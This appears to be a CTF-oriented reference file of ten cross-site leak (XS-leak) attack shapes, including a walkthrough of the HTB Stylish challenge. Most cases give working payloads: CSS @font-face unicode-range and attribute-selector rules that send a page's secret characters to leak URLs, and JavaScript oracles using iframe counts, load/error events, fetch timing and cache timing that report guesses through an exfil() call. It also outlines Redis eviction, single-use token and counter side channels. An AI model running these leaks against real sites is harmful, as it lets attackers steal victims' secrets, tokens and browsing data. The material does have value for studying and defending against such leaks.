# Case studies — the XS-leak shapes, worked end to end

Complete walkthroughs of the real XS-leak shapes.

---

## Case 1 — the CSS unicode-range font-load — the verified card shape

The HTB Stylish pattern — the verified chain in this repository.

```text
a sorted 32-char token; a CSP with `font-src 'self' *` (a host
wildcard); a reflected secret in an element's attribute; a bot that
visits a target page with a custom-CSS surface.
```

```css
/* one @font-face per alphabet char — each its own unicode-range+URL */
@font-face{font-family:x;src:url('/leak/61');unicode-range:U+0061}
@font-face{font-family:x;src:url('/leak/62');unicode-range:U+0062}
/* ... through the whole alphabet */
#secret{font-family:x;display:block !important}
```

The browser downloads a face only when a char inside its
unicode-range renders — the requested font URLs ARE the character
SET. a sorted secret → the set IS the token. then a second
stylesheet's @font-face src is the same-origin privileged URL with
the token — the bot's font load is the privileged GET that no
external client could fire.

## Case 2 — the LRU-eviction channel — the sealed high-bandwidth leak

```text
a redis with --maxmemory-policy allkeys-lru; a GET that touches a
key refreshes it; the bot's GETs to per-candidate URLs seed the
store. flood the store to force eviction → the surviving keys are
the bot's fetch → thousands of bits.
```

## Case 3 — the frame-count oracle — a search's iframe count

```text
a search page that renders one <iframe> per matching result — the
frame count is readable cross-origin without SOP. a hit renders N
frames; a miss renders 0.
```

```js
var f=document.createElement('iframe');
f.src='https://t/search?q='+guess;
f.onload=()=>exfil(guess+'='+f.contentWindow.frames.length);
```

## Case 4 — the error-event oracle — a 200 vs 404 search

```text
a search endpoint that 200s on a hit, 404s on a miss — an <img>/
<script>/<iframe> onload vs onerror.
```

```js
var i=new Image();
i.onload=()=>exfil('hit'); i.onerror=()=>exfil('miss');
i.src='https://t/search?q='+guess;
```

## Case 5 — the :visited history oracle — a 404-not-in-history

```text
a search URL whose response was 404 never enters history — a link
to it styled :visited has a different repaint cost than an
unvisited control — a history read.
```

## Case 6 — the one-shot-token channel — a GETDEL

```text
a GETDEL or single-use nonce — a GET that consumes it — 'did the
token survive the bot's visit' is one bit. it burns your check —
spend it last.
```

## Case 7 — the counter channel — a next-value read

```text
a GET that increments a counter you can read — 'the counter is N+1
after the bot's visit' → the bot's GET ran → the candidate matched.
```

## Case 8 — the CSS-attribute-selector substring oracle — the n-gram leak

```css
/* a substring oracle — 'does X occur' — queried over all n-grams */
body[secret*="abc"]{--m:url('/leak/abc')}
/* thousands of rules — one per 3-gram — the matched set
   reassembles the secret via beam search */
```

## Case 9 — the timing oracle — a slow query vs a fast rejection

```js
var t0=performance.now();
fetch('https://t/api/search?q='+guess,{mode:'no-cors'})
 .finally(()=>exfil(guess+'='+Math.round(performance.now()-t0)));
```

## Case 10 — the cache-probe oracle — a cached resource's timing

```js
// a resource the victim's browser cached — a second load is faster
var i=new Image(); var t0=performance.now();
i.onload=()=>exfil(guess+'='+Math.round(performance.now()-t0));
i.src='https://t/r/'+guess+'?cb='+Math.random();
```

## The per-case ledger

```bash
python3 tools/state.py <c> --hypothesis \
  "xs-leaks-case: <shape> — oracle=<channel> — secret=<target>"
```
